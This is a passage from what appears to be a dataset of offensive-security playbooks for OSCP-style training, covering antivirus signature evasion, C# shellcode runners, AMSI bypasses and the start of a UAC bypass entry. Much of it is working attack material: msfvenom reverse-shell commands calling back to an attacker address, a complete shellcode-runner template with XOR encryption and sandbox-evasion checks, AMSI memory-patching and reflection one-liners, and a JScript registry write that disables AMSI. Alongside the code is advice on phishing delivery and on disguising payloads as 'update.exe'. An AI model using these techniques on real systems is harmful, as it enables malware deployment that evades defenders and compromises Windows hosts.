similar signature-based AV. This workflow has 80-90% success rate if followed methodically. Time investment: 20-25 minutes evasion testing vs. 2-3 hours failed exploitation attempts = clear ROI.""}]","[{""title"": ""Phase 1: Signature Identification"", ""notes"": ""Before modifying anything, find exact bytes causing detection. Binary search method fastest for large payloads (50KB+). Signature usually 10-100 bytes. ClamAV testing (offline) prevents alerting target EDR. Use find-av-signature for automated binary search. Manual verification: Split payload in hex editor, test each half. Time estimate: 10-15 minutes for 50KB payload."", ""commands"": [{""id"": ""find-av-signature"", ""example"": ""Import-Module .\\Find-AVSignature.ps1\nFind-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\\Tools\\payload.exe -OutPath C:\\Tools\\avtest -Verbose -Force"", ""shows"": ""Creates test files in output directory. Scan each with AV...""}, {""id"": ""clamscan-test"", ""example"": ""cd 'C:\\Program Files\\ClamAV\\'\n.\\clamscan.exe C:\\Tools\\payload.exe"", ""shows"": ""Clean: 'OK' or '0 infected'\nDetected: Signature name and ...""}]}, {""title"": ""Phase 2: Encoding Techniques"", ""notes"": ""Try encoders in order: Shikata \u2192 Zutto \u2192 AES Encryption. Shikata oldest and most detected, but fastest (3 minutes). Zutto newer but also has signatures (Defender database updated 2022). AES requires custom runner but most reliable (key uniqueness). Encoding iterations: 5-10x for Shikata, 3-5x for Zutto. Diminishing returns after 10 iterations (performance overhead). Combine encoders only if single method fails (layered approach)."", ""commands"": [{""id"": ""msfvenom-encoder-shikata"", ""example"": ""msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe"", ""shows"": ""Encoded executable created. Note: Likely still detected b...""}, {""id"": ""msfvenom-encoder-zutto"", ""example"": ""msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -e x64/zutto_dekiru -i 10 -f exe -o payload64.exe"", ""shows"": ""x64 encoded executable. Same limitations as shikata - lik...""}, {""id"": ""msfvenom-encrypt-aes"", ""example"": ""msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 --encrypt aes256 --encrypt-key MySecretKey2024 -f exe -o payload_aes.exe"", ""shows"": ""AES-encrypted executable. Better evasion than encoding bu...""}]}, {""title"": ""Phase 3: Manual Modification"", ""notes"": ""When encoders fail, manual byte modification required. Change flagged bytes to equivalent instructions (e.g., XOR EAX, EAX = MOV EAX, 0 = SUB EAX, EAX). Preserve functionality while breaking signature. Use modify-signature-bytes for automation. NOP sleds (0x90) shift offsets without breaking code. Template injection (msfvenom -x) embeds payload in legitimate binary. Test modifications with clamscan-test before target deployment. Time estimate: 5-10 minutes per modification cycle."", ""commands"": [{""id"": ""modify-signature-bytes"", ""example"": ""$bytes = [System.IO.File]::ReadAllBytes('C:\\Tools\\payload.exe')\n$bytes[18867] = 0x00\n[System.IO.File]::WriteAllBytes('C:\\Tools\\payload_modified.exe', $bytes)"", ""shows"": ""Modified executable created. Test with AV scan - should b...""}, {""id"": ""msfvenom-template-injection"", ""example"": ""msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -x /usr/share/windows-binaries/nc.exe -f exe -o payload_injected.exe"", ""shows"": ""Executable with embedded payload. Template's original fun...""}]}, {""title"": ""Phase 4: Testing & Validation"", ""notes"": ""ALWAYS test offline first with ClamAV (saves time, avoids alerting target EDR). Progression: ClamAV \u2192 Local Defender \u2192 Target. Only deploy to target after passing all offline tests. Document which modifications worked for future reference (payload library). Success indicators: ClamAV clean, Defender allows write, execution successful, reverse shell connects. Failure indicators: Immediate deletion (signature detection), Quarantine (heuristic detection), Runtime error (payload corrupted). Time investment: 20-25 minutes total testing (10-15 minutes ClamAV, 5-10 minutes Defender, 2-3 minutes target). Operational security: Offline testing prevents IP/account flagging in EDR logs."", ""commands"": [{""id"": ""clamscan-test"", ""example"": ""cd 'C:\\Program Files\\ClamAV\\'\n.\\clamscan.exe C:\\Tools\\payload.exe"", ""shows"": ""Clean: 'OK' or '0 infected'\nDetected: Signature name and ...""}]}]"
"shellcode-runner-evasion","Shellcode Runner Evasion - Building Custom Loaders","Step-by-step guide for creating AV-evading shellcode runners in C#. Covers basic execution, encryption layers, sandbox detection, and compilation workflows.","shellcode|csharp|evasion|encryption|sandbox|compilation|msfvenom|custom-loader","{""how_to_recognize"": [""Msfvenom payloads immediately flagged by Windows Defender"", ""Meterpreter executables quarantined on disk write"", ""Standard reverse shells detected by AV during staging""], ""when_to_look_for"": [""When msfvenom encoding alone fails to evade detection"", ""Need custom payload delivery after initial access"", ""Building client-side attacks (HTA, Office macros) requiring embedded shellcode""]}","[{""title"": ""Scenario 1: Msfvenom Payload Caught by Defender (Basic Runner)"", ""context"": ""Standard msfvenom reverse shell (windows/x64/meterpreter/reverse_https) detected immediately when written to disk. Need custom C# runner to evade signature-based detection."", ""approach"": ""Phase 1: Shellcode Generation (2 minutes)\n- Generate raw shellcode with msfvenom-csharp-payload\n- Save output as byte array\n\nPhase 2: Basic Runner Creation (5 minutes)\n- Use csharp-shellcode-runner-basic template\n- Embed shellcode byte array into C# code\n- Replace placeholder with actual shellcode\n\nPhase 3: Compilation & Testing (3 minutes)\n- Compile with compile-csharp-runner (using csc.exe)\n- Test locally with Defender enabled\n- Expect detection at this stage (baseline)\n\nPhase 4: Add Encryption Layer (5 minutes)\n- Apply csharp-xor-encrypt to shellcode\n- Update runner to decrypt at runtime\n- Recompile and test\u2014should evade basic signatures"", ""commands"": [""msfvenom-csharp-payload"", ""csharp-shellcode-runner-basic"", ""csharp-xor-encrypt"", ""compile-csharp-runner""], ""expected_outcome"": ""Basic runner detected, encrypted runner evades Defender in 10-15 minutes total. Custom loader bypasses signature-based detection."", ""why_this_works"": ""AV signatures match msfvenom's default byte sequences. XOR encryption changes byte pattern while preserving functionality. Runtime decryption happens in memory, avoiding disk-based scans.""}, {""title"": ""Scenario 2: Advanced Evasion (Multi-Layer Encryption)"", ""context"": ""Single XOR encryption caught by heuristic analysis. Target has updated Defender definitions. Need multiple obfuscation layers to evade behavioral detection."", ""approach"": ""Phase 1: Layer 1 - Caesar Cipher (3 minutes)\n- Apply csharp-caesar-encrypt to original shellcode\n- Embed decryption routine in runner\n\nPhase 2: Layer 2 - XOR Encryption (3 minutes)\n- Apply csharp-xor-encrypt to Caesar-encrypted shellcode\n- Add second decryption routine (decrypt XOR, then Caesar)\n\nPhase 3: Compilation & Validation (4 minutes)\n- Compile with compile-csharp-runner\n- Test execution with local listener\n- Verify Meterpreter session establishes\n\nPhase 4: Heuristic Evasion Check (optional, 5 minutes)\n- Add csharp-sleep-timer to delay execution\n- Prevents sandbox timeout-based detection"", ""commands"": [""csharp-caesar-encrypt"", ""csharp-xor-encrypt"", ""csharp-shellcode-runner-basic"", ""csharp-sleep-timer"", ""compile-csharp-runner""], ""expected_outcome"": ""Multi-layer encryption evades both signature and basic heuristic detection in 15-20 minutes. Sleep timer bypasses sandbox analysis."", ""why_this_works"": ""Layered encryption exponentially increases signature space. Each layer requires separate decryption routine AV must analyze. Sleep timers exceed typical sandbox analysis timeout (2-5 minutes).""}, {""title"": ""Scenario 3: Sandbox Detection (NUMA API & Resource Checks)"", ""context"": ""Payload executes locally but fails on target system. Likely caught in sandbox/VM environment. Need environment validation before shellcode execution."", ""approach"": ""Phase 1: Environment Checks (5 minutes)\n- Add csharp-non-emulated-api to runner (NUMA node check)\n- Query system resources with implied checks\n- Abort execution if in sandbox\n\nPhase 2: Timing Validation (3 minutes)\n- Integrate csharp-sleep-timer with actual timing check\n- Measure sleep duration accuracy (sandboxes fast-forward)\n\nPhase 3: Combined Validation (4 minutes)\n- Require BOTH checks to pass before shellcode execution\n- Compile and test in VM vs physical machine\n\nPhase 4: Production Deployment (3 minutes)\n- Combine with encryption from Scenario 2\n- Final compilation with all evasion techniques"", ""commands"": [""csharp-non-emulated-api"", ""csharp-sleep-timer"", ""csharp-shellcode-runner-basic"", ""compile-csharp-runner""], ""expected_outcome"": ""Sandbox evasion successful in 12-15 minutes. Payload executes on real systems, aborts in analysis environments."", ""why_this_works"": ""NUMA API (VirtualAllocExNuma) not emulated in most sandboxes\u2014call fails, indicating VM. Sleep measurement detects time acceleration. Dual checks increase confidence.""}, {""title"": ""Scenario 4: Production Compilation (End-to-End Workflow)"", ""context"": ""Final payload ready for deployment. Need proper compilation with optimization flags and anti-analysis measures for client-side attack."", ""approach"": ""Phase 1: Code Preparation (2 minutes)\n- Finalize C# runner with all evasion techniques\n- Verify shellcode encrypted with csharp-xor-encrypt\n- Confirm sandbox checks with csharp-non-emulated-api\n\nPhase 2: Compilation (3 minutes)\n- Use compile-csharp-runner with release flags\n- Enable optimizations (/optimize+)\n- Strip debug symbols\n\nPhase 3: Testing Matrix (5 minutes)\n- Test on clean Windows 10 VM (Defender enabled)\n- Verify execution without alerts\n- Confirm Meterpreter callback\n\nPhase 4: Delivery Preparation (5 minutes)\n- Rename executable to benign name (e.g., 'update.exe')\n- Optional: Sign with self-signed certificate\n- Stage on attack infrastructure"", ""commands"": [""msfvenom-csharp-payload"", ""csharp-xor-encrypt"", ""csharp-non-emulated-api"", ""csharp-shellcode-runner-basic"", ""compile-csharp-runner""], ""expected_outcome"": ""Production-ready payload in 15-20 minutes. Evades Defender, executes in real environments, bypasses basic sandboxes."", ""why_this_works"": ""Compilation optimizations remove debugging artifacts AV uses for detection. Release builds have different binary structure than debug. Combined with encryption and sandbox checks, signature space becomes too large to maintain.""}]","[{""title"": ""Phase 1: Shellcode Generation"", ""notes"": ""Start with raw shellcode in C# byte array format. Avoid executable formats at this stage\u2014focus on getting raw bytes ready for embedding."", ""commands"": [{""id"": ""msfvenom-csharp-payload"", ""example"": ""msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f csharp"", ""shows"": ""Shellcode byte array in C# format:\nbyte[] buf = new byte[...""}]}, {""title"": ""Phase 2: Basic Runner Framework"", ""notes"": ""Create minimal C# runner that allocates memory and executes shellcode. This WILL be detected\u2014it's your baseline for testing encryption effectiveness."", ""commands"": [{""id"": ""csharp-shellcode-runner-basic"", ""example"": ""using System;\nusing System.Runtime.InteropServices;\n\nnamespace ShellcodeRunner {\n    class Program {\n        [DllImport(\""kernel32\"")]\n        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n        \n        [DllImport(\""kernel32\"")]\n        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n        \n        [DllImport(\""kernel32\"")]\n        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n        \n        static void Main(string[] args) {\n            byte[] buf = new byte[] { 0xfc,0x48,0x83,0xe4,0xf0 };\n            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);\n            Marshal.Copy(buf, 0, addr, buf.Length);\n            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n            WaitForSingleObject(hThread, 0xFFFFFFFF);\n        }\n    }\n}"", ""shows"": ""No console output. Shellcode executes (e.g., reverse shel...""}, {""id"": ""compile-csharp-runner"", ""example"": ""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:runner.exe Program.cs"", ""shows"": ""runner.exe created in current directory. No output = succ...""}]}, {""title"": ""Phase 3: Encryption Layers"", ""notes"": ""Apply multiple encryption algorithms sequentially. Order matters: Encrypt with Caesar, then XOR. Decrypt in reverse order at runtime. Test after each layer to find minimum required."", ""commands"": [{""id"": ""csharp-caesar-encrypt"", ""example"": ""// ENCRYPTION (offline)\nbyte[] buf = new byte[] { 0xfc,0x48,0x83 };\nbyte[] encoded = new byte[buf.Length];\nfor(int i = 0; i < buf.Length; i++) {\n    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);\n}\n// Print encoded array\nConsole.WriteLine(\""byte[] encoded = new byte[] { \"" + string.Join(\"",\"", encoded.Select(b => $\""0x{b:X2}\"")) + \"" };\"");\n\n// DECRYPTION (runtime in runner)\nfor(int i = 0; i < buf.Length; i++) {\n    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);\n}"", ""shows"": ""Encrypted runner bypasses static signatures. Shellcode ex...""}, {""id"": ""csharp-xor-encrypt"", ""example"": ""// ENCRYPTION (offline)\nbyte[] buf = new byte[] { 0xfc,0x48,0x83 };\nbyte[] encoded = new byte[buf.Length];\nfor(int i = 0; i < buf.Length; i++) {\n    encoded[i] = (byte)((uint)buf[i] ^ 0xAA);\n}\n\n// DECRYPTION (runtime - same operation)\nfor(int i = 0; i < buf.Length; i++) {\n    buf[i] = (byte)((uint)buf[i] ^ 0xAA);\n}"", ""shows"": ""XOR encrypted payload bypasses more signatures than Caesa...""}]}, {""title"": ""Phase 4: Sandbox Evasion"", ""notes"": ""Add environment validation checks. NUMA API check is most reliable (API not emulated). Sleep timers useful but can be bypassed. Combine multiple checks for higher confidence."", ""commands"": [{""id"": ""csharp-non-emulated-api"", ""example"": ""using System;\nusing System.Runtime.InteropServices;\n\n[DllImport(\""kernel32.dll\"", SetLastError = true, ExactSpelling = true)]\nstatic extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);\n\n[DllImport(\""kernel32.dll\"")]\nstatic extern IntPtr GetCurrentProcess();\n\n// Sandbox check\nIntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);\nif(mem == null) {\n    return; // Sandbox detected - API not emulated\n}\n// Continue with payload"", ""shows"": ""In sandbox: Exits (NULL returned). On real system: Contin...""}, {""id"": ""csharp-sleep-timer"", ""example"": ""using System;\nusing System.Threading;\n\nDateTime t1 = DateTime.Now;\nThread.Sleep(10000);\ndouble deltaT = DateTime.Now.Subtract(t1).TotalSeconds;\nif(deltaT < 9.5) {\n    return; // Sandbox detected - exit\n}\n// Continue with payload execution"", ""shows"": ""In sandbox: Exits immediately (sandbox detected). On real...""}]}, {""title"": ""Phase 5: Final Compilation"", ""notes"": ""Always compile with release flags (/optimize+) for production. Debug builds leak metadata and have different signatures. Test final binary on fresh VM with Defender enabled."", ""commands"": [{""id"": ""compile-csharp-runner"", ""example"": ""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:runner.exe Program.cs"", ""shows"": ""runner.exe created in current directory. No output = succ...""}]}]"
"amsi-bypass-methodology","AMSI Bypass - Comprehensive Methodology","Scenario-based guide for bypassing AMSI in Windows 10/11 environments. Covers memory patching, context corruption, and registry-based bypasses with timing estimates.","amsi|windows-defender|powershell|bypass|evasion|memory-patching|registry|oscp-priority|post-exploitation|av-evasion","{""how_to_recognize"": [""PowerShell script blocked with 'This script contains malicious content' error"", ""Invoke-Expression fails with AMSI detection message"", ""Download cradles (IEX, WebClient) trigger immediate blocking"", ""Known malicious strings ('Invoke-Mimikatz', 'amsiutils') cause red error messages"", ""Base64-encoded payloads decode successfully but execution is blocked"", ""Remote PowerShell scripts download but won't execute via IEX""], ""when_to_look_for"": [""After gaining initial shell on Windows 10/11 systems (AMSI enabled by default)"", ""Before executing PowerShell-based tools (Mimikatz, PowerView, Invoke-Obfuscation)"", ""When remote download cradles fail with AMSI errors"", ""During phishing campaigns using JScript/VBScript payloads (AMSI integrated in WSH)"", ""When Meterpreter PowerShell post-exploitation modules are blocked"", ""Before running any PowerShell enumeration scripts on target systems""]}","[{""title"": ""Scenario 1: PowerShell Download Cradle (AMSI Blocks IEX)"", ""context"": ""Target: Windows 10 21H2 with Defender enabled. You have initial shell access (cmd.exe) and need to download/execute PowerShell payload. Standard IEX download cradle triggers AMSI detection immediately."", ""approach"": ""Phase 1: Detection (30 seconds)\n- Test AMSI with benign payload using amsi-test-payload\n- Execute: powershell -c \""'Invoke-Mimikatz'\""\n- Verify 'malicious content' error appears (confirms AMSI active)\n\nPhase 2: Context Corruption Bypass (1-2 minutes)\n- Execute amsi-context-corruption one-liner from cmd.exe\n- Paste full reflection-based bypass into PowerShell session\n- Verify AMSI bypass with second amsi-test-payload test\n- Execute actual download cradle if bypass successful\n- Time checkpoint: Should see no red errors within 2 minutes\n\nPhase 3: Fallback (if Phase 2 fails, 2-3 minutes)\n- Try amsi-memory-patch as alternative (more code but more reliable)\n- Paste complete memory patching script into PowerShell\n- Test persistence of bypass across PowerShell sessions\n- If still failing, try amsi-init-failed (fastest but least reliable)"", ""commands"": [""amsi-test-payload"", ""amsi-context-corruption"", ""amsi-memory-patch"", ""amsi-init-failed""], ""expected_outcome"": ""AMSI bypassed in 2-4 minutes total. Download cradles execute without detection. Bypass persists for current PowerShell session only (not across reboots or new sessions). Success indicators: Test payload echoes without red error, IEX downloads execute cleanly, No EventLog 1116 entries (AMSI scan blocked). Failure indicators: Red 'malicious content' error persists, PowerShell crashes during bypass, New sessions revert to AMSI-protected state."", ""why_this_works"": ""Context corruption zeroes out AmsiContext structure before AmsiScanBuffer is called. This prevents AMSI from initializing properly, causing silent failure with E_INVALIDARG return code. Windows logs error internally but allows execution to continue (fail-open design). Memory patching directly overwrites AmsiScanBuffer's return value to always return AMSI_RESULT_CLEAN (0x00000000). Patches with assembly: XOR RAX,RAX; RET (0x48,0x31,0xC0,0xC3) which forces clean scan result. Technical depth: AmsiScanBuffer resides in amsi.dll loaded by PowerShell process. VirtualProtect changes memory page from RX to RWX (0x40), allowing write to executable code. After patching, all subsequent AmsiScanBuffer calls return clean immediately without scanning. OSCP relevance: Critical for exam - most public PowerShell tools are AMSI-flagged. Practice all three methods before exam day.""}, {""title"": ""Scenario 2: Meterpreter Post-Exploitation (AMSI Flags Scripts)"", ""context"": ""You have Meterpreter shell on Windows 11 target. Attempting to run post-exploitation PowerShell scripts (PowerView, Invoke-Mimikatz) triggers AMSI detection and blocks execution. Standard Meterpreter PowerShell extension is blocked."", ""approach"": ""Phase 1: Verification (1 minute)\n- From Meterpreter, run 'load powershell' and attempt execution\n- Execute amsi-test-payload via 'powershell_execute' command\n- Confirm AMSI is active and blocking (see red errors in output)\n- Document exact error message for troubleshooting\n\nPhase 2: AmsiInitFailed Bypass (2 minutes)\n- Execute amsi-init-failed one-liner to force AMSI initialization failure\n- From Meterpreter: powershell_execute \""[Ref].Assembly.GetTypes()...\""\n- Re-test with amsi-test-payload immediately after\n- Load PowerView/Mimikatz if successful (no red errors)\n- Time checkpoint: Should have working bypass within 3 minutes\n\nPhase 3: Staged Payloads (if Phase 2 fails, 3-5 minutes)\n- Use amsi-base64-staging to obfuscate payload on attacker machine\n- Generate Base64 payload: echo -n \""[bypass]\"" | iconv -t UTF-16LE | base64 -w0\n- Execute via: powershell -EncodedCommand <BASE64>\n- Base64 delays AMSI scanning until runtime, may evade detection\n- If Base64 still blocked, use amsi-memory-patch as last resort"", ""commands"": [""amsi-test-payload"", ""amsi-init-failed"", ""amsi-base64-staging"", ""amsi-memory-patch""], ""expected_outcome"": ""AMSI bypassed within 3-6 minutes total. PowerShell post-exploitation tools execute successfully. Meterpreter session remains stable throughout bypass attempts. Success indicators: PowerView/Mimikatz execute without errors, No process crashes or session disconnects, Subsequent PowerShell commands run cleanly. Failure indicators: Session terminates during bypass attempt (restart and use alternate method), Bypass works but doesn't persist (normal - reapply for each new command), Memory patching blocked by EDR (try context corruption instead). Next steps: Document which bypass method worked for this target (reuse on similar systems), Run full post-exploitation enumeration (now unblocked), Consider persistence mechanisms if long-term access needed."", ""why_this_works"": ""Forcing AmsiInitialize to return failure code makes Windows think AMSI library is unavailable. System logs error (Event ID 1116) but continues execution (backwards compatibility with systems where AMSI.DLL missing). This is Microsoft's fail-open design - prioritizes execution over security. Base64 staging avoids on-disk signatures and delays AMSI scanning until runtime. AMSI scans when script enters PowerShell parser, but EncodedCommand bypasses initial scan. However, newer Defender versions (2022+) scan decoded Base64 too, making this method less reliable. Technical depth: AmsiInitFailed flag is static field in System.Management.Automation.AmsiUtils class. Setting to $true causes all subsequent AmsiScanBuffer calls to immediately return without scanning. Reflection allows runtime modification of private static fields without recompiling .NET assemblies. OSCP tip: AmsiInitFailed is fastest but most likely to be patched in exam machines. Always test on practice labs first. Memory patching more reliable but requires more code and time.""}, {""title"": ""Scenario 3: WSH/JScript Macro Delivery (AMSI Blocks WSH)"", ""context"": ""Phishing scenario: Delivering JScript payload via HTA or WSF file. Windows 10 1909+ has AMSI integrated into Windows Script Host, blocking malicious JScript even before PowerShell is involved. Victim double-clicks HTA file but script is blocked."", ""approach"": ""Phase 1: Registry Bypass Preparation (2 minutes)\n- Craft HTA/WSF payload with amsi-jscript-registry one-liner embedded\n- Registry modification: HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable = 0\n- Test payload structure: Registry write -> Test string -> Actual payload\n- Ensure registry write succeeds before payload execution (error handling critical)\n\nPhase 2: Payload Delivery (1 minute)\n- Embed registry bypass at start of JScript payload (first 10 lines)\n- Test locally with amsi-test-payload equivalent: WScript.Echo('amsiutils')\n- If test string echoes without error, bypass successful\n- Execute actual malicious payload (download cradle, reverse shell, etc.)\n- Time checkpoint: Full payload execution within 3 minutes of victim click\n\nPhase 3: Cleanup Awareness (30 seconds)\n- Document registry key location: HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable\n- Note: Registry change persists until reboot or manual deletion\n- Consider cleanup script at end of payload (stealth) vs persistence (long-term access)\n- OSCP consideration: Cleanup may break other payloads if multi-stage attack"", ""commands"": [""amsi-jscript-registry"", ""amsi-test-payload""], ""expected_outcome"": ""JScript executes without AMSI interference on target system. Registry bypass persists across script executions (same user session). Requires manual cleanup to avoid detection by defenders. Success indicators: HTA/WSF file executes fully without 'malicious content' errors, Registry key created successfully (verify with reg query command), Payload executes as intended (reverse shell connects, files exfiltrated, etc.). Failure indicators: Registry write fails (rare for HKCU but possible with AppLocker/Applocker), AMSI still blocks after registry change (may indicate group policy override), Script crashes during registry write (add error handling). Time investment: 3-4 minutes total from victim click to full execution. OSCP frequency: Lower (phishing less common in exam) but critical for AD environments. Cleanup considerations: Registry key visible to forensics, persists in registry hives, may alert EDR if monitored. Alternative if registry blocked: Use PowerShell download cradle instead of JScript, or compile JScript to executable with JScript.NET compiler."", ""why_this_works"": ""Registry key 'HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable = 0' tells WSH to skip AMSI checks entirely. This is Microsoft's official interface for developers to disable AMSI during debugging - not a hack or exploit. Documented in MS-AMSI specification but widely unknown to defenders. Why exploitable: HKCU is user-writable (no admin rights needed), WSH checks registry before every script execution, No integrity checks on registry value (any user can set). Technical depth: WSH architecture: wscript.exe/cscript.exe loads jscript.dll -> jscript.dll checks HKCU\\...\\AmsiEnable before calling amsi.dll -> If value = 0, skip amsi.dll entirely. This is fail-open design for backwards compatibility with systems where AMSI missing. Security trade-off: Microsoft prioritizes developer experience over security for HKCU settings. HKLM equivalent (HKEY_LOCAL_MACHINE\\...) would require admin but is policy-enforceable. OSCP defense perspective: Group Policy can override HKCU settings, forcing AMSI enabled. But most OSCP lab/exam machines don't have this configured. Why common in wild: Phishing campaigns use HTA/WSF files extensively (bypass email filters), JScript can download/execute additional payloads without PowerShell detection, Users habituated to double-clicking .hta files from 'tech support' emails.""}]","[{""title"": ""Phase 1: Detection & Testing"", ""notes"": ""Always verify AMSI is active before attempting bypass. Baseline testing prevents wasted time on systems without AMSI enabled (Windows 7, Server 2012 R1 and older). Test with known malicious strings: 'Invoke-Mimikatz', 'amsiutils', 'AmsiScanBuffer'. If these strings echo without red errors, AMSI is not active (skip bypass, proceed directly to payload). If red 'malicious content' error appears, AMSI is active (proceed to Phase 2). Time investment: 30 seconds. OSCP tip: Test AMSI before downloading large payloads - saves bandwidth and time if bypass needed."", ""commands"": [{""id"": ""amsi-test-payload"", ""example"": ""'Invoke-Mimikatz'"", ""shows"": ""String echoes back without red 'This script contains mali...""}]}, {""title"": ""Phase 2: Quick Bypasses (In-Memory)"", ""notes"": ""Fastest methods for immediate access. These bypasses are session-specific and don't persist across reboots or new PowerShell sessions. Try in order: Context Corruption (best balance of speed/reliability) -> AmsiInitFailed (fastest but may be patched) -> Memory Patching (slowest but most reliable). All methods require active PowerShell session - can't be applied from cmd.exe to 'future' PowerShell sessions. Persistence note: Bypass must be reapplied for every new PowerShell process. Consider automating in initial access payload. OSCP timing: Budget 2-4 minutes for bypass in exam timeline. Practice typing these commands from memory - clipboard access may be limited in exam environment."", ""commands"": [{""id"": ""amsi-context-corruption"", ""example"": ""[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetFields('NonPublic,Static')|?{$_.Name-like'*Context'}|%{[IntPtr]$ptr=$_.GetValue($null);[System.Runtime.InteropServices.Marshal]::Copy([BitConverter]::GetBytes(0),0,$ptr,4)}}"", ""shows"": ""No output indicates success. Subsequent AMSI checks will ...""}, {""id"": ""amsi-init-failed"", ""example"": ""[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetFields('NonPublic,Static')|?{$_.Name-like'*InitFailed'}|%{$_.SetValue($null,$true)}}"", ""shows"": ""No output. AMSI will report initialization failure and sk...""}, {""id"": ""amsi-memory-patch"", ""example"": ""$Win32=@\""\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n    [DllImport(\""kernel32\"")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\""kernel32\"")]\n    public static extern IntPtr LoadLibrary(string name);\n    [DllImport(\""kernel32\"")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\""@\nAdd-Type $Win32\n$lib=[Win32]::LoadLibrary(\""amsi.dll\"")\n$addr=[Win32]::GetProcAddress($lib,\""AmsiScanBuffer\"")\n$p=0\n[Win32]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p)\n$patch=[Byte[]](0x48,0x31,0xC0,0xC3)\n[System.Runtime.InteropServices.Marshal]::Copy($patch,0,$addr,4)"", ""shows"": ""[+] AMSI patched successfully (if using verbose version)....""}]}, {""title"": ""Phase 3: Persistent/Alternative Bypasses"", ""notes"": ""Use when in-memory bypasses fail or when persistence is needed across reboots/sessions. Registry-based bypasses survive reboots but may trigger EDR alerts (registry modification monitoring). Base64 staging useful for evading static signatures but less effective against modern Defender (scans decoded content). Trade-offs: Persistence = Higher detection risk, Session-only = Must reapply but lower forensic footprint. OSCP considerations: Registry changes persist in lab environment (may affect other students), Base64 useful for exam machines with strict execution policies. When to use: JScript/VBScript delivery (use registry method), Initial access payloads (embed Base64), Long-term persistence needed (registry method with cleanup plan). Cleanup: Always document registry keys created - required for OSCP report."", ""commands"": [{""id"": ""amsi-jscript-registry"", ""example"": ""var sh = new ActiveXObject(\""WScript.Shell\"");\nvar key = \""HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable\"";\ntry {\n    var val = sh.RegRead(key);\n    if(val != 0) {\n        sh.RegWrite(key, 0, \""REG_DWORD\"");\n    }\n} catch(e) {\n    sh.RegWrite(key, 0, \""REG_DWORD\"");\n}\nWScript.Echo(\""AMSI disabled for WSH\"");"", ""shows"": ""Registry key set, AMSI disabled for current user's WSH se...""}, {""id"": ""amsi-base64-staging"", ""example"": ""powershell -EncodedCommand [BASE64_BYPASS]"", ""shows"": ""Bypass executes silently from encoded payload. Test with ...""}]}, {""title"": ""Phase 4: Validation"", ""notes"": ""After bypass, always re-test with known malicious payload. Confirms AMSI is truly disabled, not just returning false positives. Test with multiple strings: 'Invoke-Mimikatz' (most reliable), 'amsiutils' (alternate test), actual payload snippet (end-to-end test). If test fails after bypass: Try next bypass method in sequence, Check for EDR interference (process injection, memory protection), Verify PowerShell version (.NET 4.0+ required for reflection methods), Consider alternate execution contexts (runspaces, background jobs). Success criteria: Test string echoes without red error, No Event ID 1116 in Windows Defender logs, Actual payload executes cleanly. Time investment: 10-15 seconds per validation. OSCP workflow: Test -> Bypass -> Re-test -> Execute payload. Never skip re-test step - false positives waste precious exam time."", ""commands"": [{""id"": ""amsi-test-payload"", ""example"": ""'Invoke-Mimikatz'"", ""shows"": ""String echoes back without red 'This script contains mali...""}]}]"
"uac-bypass-techniques","UAC Bypass - Privilege Escalation Techniques","Quick reference for bypassing User Account Control on Windows 7-11. Covers FodHelper, EventVwr, and detection validation methods.","uac|bypass|privilege-escalation|windows|registry|fodhelper|eventvwr","{""how_to_recognize"": [""User is in local Administrators group but shell has medium integrity level"", ""Commands requiring elevation fail with 'access denied' despite admin membership"", ""Checking integrity level with 'whoami /groups' shows 'Medium Mandatory Level'""], ""when_to_look_for"": [""After gaining shell as standard user who is also local admin"", ""Before privilege escalation attempts when UAC is blocking admin rights"", ""When horizontal movement gives admin user but not elevated session""]}","[{""title"": ""Scenario 1: FodHelper UAC Bypass (Windows 10 17134+)"", ""context"": ""You have medium integrity shell as user who is member of local Administrators group. Need High integrity shell to run privileged commands (e.g., dump SAM, access SYSTEM files). UAC is enabled with default settings."", ""approach"": ""Phase 1: Verification (30 seconds)\n- Run check-integrity-level to confirm medium integrity\n- Verify user in Administrators group with 'net localgroup administrators'\n- Confirm Windows 10 build with 'systeminfo | findstr Build'\n\nPhase 2: FodHelper Exploitation (2 minutes)\n- Use fodhelper-uac-bypass to set registry key\n- Trigger FodHelper.exe execution (auto-elevates due to manifest)\n- Catch reverse shell with elevated privileges\n\nPhase 3: Validation (30 seconds)\n- Run check-integrity-level again\n- Should show 'High Mandatory Level'\n- Verify with administrative command (e.g., 'psexec -s cmd')"", 